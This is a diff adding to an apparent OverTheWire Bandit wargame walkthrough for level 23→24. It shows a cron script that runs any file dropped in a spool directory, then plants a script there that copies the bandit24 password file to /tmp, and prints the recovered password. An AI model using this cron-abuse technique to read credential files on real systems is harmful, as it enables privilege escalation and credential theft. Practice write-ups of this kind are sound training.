@@ -526,12 +526,40 @@ ssh bandit.labs.overthewire.org -p 2220 -l bandit23
 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
 
 ```Bash
+bandit23@bandit:~$ more /etc/cron.d/cronjob_bandit24 
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ more /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
 
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+
+bandit23@bandit:~$ echo "more /etc/bandit_pass/bandit24 >/tmp/4321.txt" > /tmp/1234.sh
+bandit23@bandit:~$ chmod 777 /tmp/1234.sh
+bandit23@bandit:~$ cp /tmp/1234.sh /var/spool/bandit24/
+bandit23@bandit:~$ more /tmp/4321.txt
+::::::::::::::
+/etc/bandit_pass/bandit24
+::::::::::::::
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 ```
 
 ```Bash
-ssh bandit.labs.overthewire.org -p 2220 -l banditx
+ssh bandit.labs.overthewire.org -p 2220 -l bandit24
 ```
 
 
